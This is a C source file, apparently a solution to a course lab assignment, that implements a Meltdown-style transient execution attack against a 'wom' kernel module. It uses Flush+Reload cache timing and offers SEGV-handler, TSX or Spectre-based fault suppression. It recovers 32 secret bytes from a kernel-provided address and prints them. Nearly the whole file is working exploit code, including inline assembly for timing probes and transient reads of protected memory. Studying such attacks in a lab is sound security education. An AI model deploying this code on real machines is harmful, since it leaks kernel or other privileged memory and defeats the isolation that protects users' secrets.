#include <emmintrin.h>
#define _GNU_SOURCE
#include "wom/wom_ioctl.h"
#include <err.h>
#include <limits.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <x86intrin.h>
#define SEGV 0
#define TSX 1
#define SPECTRE 2
#ifndef PF_SUPPRESS
/* You should use let makefile to set fault supression strategy. */
#define PF_SUPPRESS SPECTRE
#endif

static jmp_buf buf;
char *probe_array;
int *array_size;

// when seg fault is raised just jump
void handle_segv(int sig) {
  (void)sig;
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, sig);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
  longjmp(buf, 1);
}

unsigned long reload_and_flush(void *adrs) {
  unsigned long low1, low2, high1, high2, time;
  asm __volatile__("mfence              \n\t"
                   "lfence              \n\t"
                   "rdtsc               \n\t" // read pre-access time
                   "mov %%rax, %0       \n\t" // store time lower bits
                   "mov %%rdx, %1       \n\t" // store time higher bits
                   "lfence              \n\t"
                   "mov (%4), %%rax     \n\t" // memory access
                   "lfence              \n\t" // wait for memory access
                   "rdtsc               \n\t" // read post-access time
                   "mov %%rax, %2       \n\t" // store time lower bits
                   "mov %%rdx, %3       \n\t" // store time higher bits
                   : "=r"(low1), "=r"(high1), "=r"(low2), "=r"(high2)
                   : "c"(adrs) // rcx for adrs
                   : "%rax", "%rbx", "%rdx");
  _mm_clflush(adrs);
  time = ((high2 << 32) ^ low2) - ((high1 << 32) ^ low1);
  return time;
}

#if PF_SUPPRESS == SEGV
void __attribute__((optimize("-Os"), noinline)) meltdown(void *target_byte) {
  if (!setjmp(buf)) {
    asm volatile("1:\n"
                 "movzx (%%rcx), %%rax\n"
                 "shl $12, %%rax\n"
                 "jz 1b\n"
                 "movq (%%rbx,%%rax,1), %%rbx\n"
                 :
                 : "c"(target_byte), "b"(probe_array)
                 : "rax");
  }
}

#elif PF_SUPPRESS == TSX
// tsx instructions
// https://github.com/IAIK/meltdown/blob/master/libkdump/libkdump.c#L222
static __attribute__((always_inline)) inline unsigned int xbegin(void) {
  unsigned status;
  // asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
  asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00"
               : "=a"(status)
               : "a"(-1UL)
               : "memory");
  return status;
}

static __attribute__((always_inline)) inline void xend(void) {
  // asm volatile("xend" ::: "memory");
  asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
}

void __attribute__((optimize("-Os"), noinline)) meltdown(void *target_byte) {
  if (xbegin() == ~0u) {
    asm volatile("1:\n"
                 "movzx (%%rcx), %%rax\n"
                 "shl $12, %%rax\n"
                 "jz 1b\n"
                 "movq (%%rbx,%%rax,1), %%rbx\n"
                 :
                 : "c"(target_byte), "b"(probe_array)
                 : "rax");
    xend();
  }
}
#else /* FAULT_SUPPR == SPECTRE */
int temp = 0;
void __attribute__((optimize("-O0"), noinline)) meltdown(void *target_byte) {
  if (posix_memalign((void **)&array_size, 4096, 4096) != 0) {
    return;
  }
  for (int i = 0; i < 4096 / sizeof(int); ++i)
    array_size[i] = 30;
  unsigned char array1[30];
  unsigned long stupid[31];
  unsigned char rb_offset[31];
  // TODO: access out of range of reload buffer.
  for (int i = 0; i < 30; i++) {
    array1[i] = 1;
    stupid[i] = 1;
    rb_offset[i] = 255;
  }
  _mm_clflush(probe_array);

  // unsigned long target_offset = ((unsigned long)target_byte) - ((unsigned
  // long)array1); stupid[30] = target_offset;
  stupid[30] = ((unsigned long)target_byte) - ((unsigned long)array1);
  rb_offset[30] = 0;

  for (int i = 0; i < 31; i++) {
    char *rb = &probe_array[rb_offset[i] * 4096];
    unsigned long x = stupid[i];

    // _mm_clflush(&rb[array1[0] * 4096]);
    _mm_clflush(&array_size[((i * 167) + 13) % (4096 / sizeof(int))]);
    _mm_clflush(&array_size);
    _mm_mfence();
    _mm_lfence();

    if (x < array_size[((i * 167) + 13) % (4096 / sizeof(int))]) {
      temp = array1[x];
      temp = rb[temp * 4096];
      // probe_array[array1[x] * 4096];
      // _mm_mfence();
      // _mm_lfence();
      // _mm_clflush(&probe_array[array1[x] * 4096]);
      // printf("%d, ")
    }
  }
  free(array_size);
}

#endif

int main(int argc, char *argv[]) {
  void *secret_ptr;
  int fd;

  if ((fd = wom_open()) < 0) {
    err(1, "wom_open");
  }

  if (wom_get_address(fd, &secret_ptr)) {
    err(2, "wom_get_address");
  }

  unsigned long times[256], maxs[256];
  const int round = 10;
  char ans[32];
  char buffer[32];
  if (posix_memalign((void **)&probe_array, 4096, 257 * 4096) != 0) {
    return -1;
  }
  memset(probe_array, 'A', 257 * 4096);
  // char *sanity_check = "ABCDEFGHABCDEFGHABCDEFGHABCDEFGH";
  // secret_ptr = sanity_check;
  // _mm_clflush(sanity_check);

  // registering handler for seg fault
  // signal(SIGSEGV, handle_segv);

  struct sigaction segv_act;
  segv_act.sa_handler = handle_segv;
  sigaction(SIGSEGV, &segv_act, NULL);

  for (int j = 0; j < 256; j++) {
    _mm_clflush(&probe_array[j * 4096]);
  }

  for (int i = 0; i < 32; i++) {
    // for (int i = 0; i < 4; i++) {
    for (int j = 0; j < 256; j++) {
      times[j] = 0;
      maxs[j] = 0;
    }
    for (int r = 0; r < round; ++r) {
      for (int tries = 0; tries < 1000; tries++) {
        // abusing wom's read function that invokes READ_ONCE
        volatile ssize_t n = pread(fd, buffer, 1, i);
        meltdown(secret_ptr + i);
      }

      for (int j = 0; j < 256; j++) {
        int k = ((j * 167) + (13 + 2 * r)) % 256;
        unsigned long time = reload_and_flush(&probe_array[k * 4096]);
        /* printf("%ld ", time); */
        times[k] += time;
        if (time > maxs[k])
          maxs[k] = time;
        /* if (time < 100) { */
        /*   printf("\ncache hit:%d %ld cycles", k, time); */
        /* } */
      }
    }

    int secret_idx = 0;
    unsigned long min_time = ULONG_MAX;
    for (int j = 0; j < 256; j++) {
      if (times[j] < min_time) {
        min_time = times[j];
        secret_idx = j;
      }
    }
    for (int j = 0; j < 256; j++) {
      if (j % 10 == 0)
        printf("\n%2d", j / 10);
      printf("   %4ld,%4ld", times[j] / round, maxs[j]);
    }
    printf("\n\n");

    for (int j = 0; j < 256; j++) {
      times[j] = (times[j] - maxs[j]) / (round - 1);
      if (j % 10 == 0)
        printf("\n%d", j / 10);
      printf("\t%ld", times[j]);
      if (times[j] < min_time) {
        min_time = times[j];
        secret_idx = j;
      }
    }
    printf("\n\n");
    ans[i] = secret_idx;
    /* printf("\n%d\n\n", i); */
    printf("byte %d: %d %ld\n", i, secret_idx, min_time);
  }

  /* Your code goes here instead of the following 2 lines */
  printf("secret @ %p\n", secret_ptr);
  /* Don't buffer stdout, so no need to ever fflush(stdout) */
  setbuf(stdout, NULL);
  srandom(getpid());
  printf("SECRET=");
  for (int i = 0; i < 32; ++i) {
    if (ans[i] < 33)
      ans[i] = 32;

    printf("%c", ans[i]);
  }

  printf("\n");
  return 0;
}
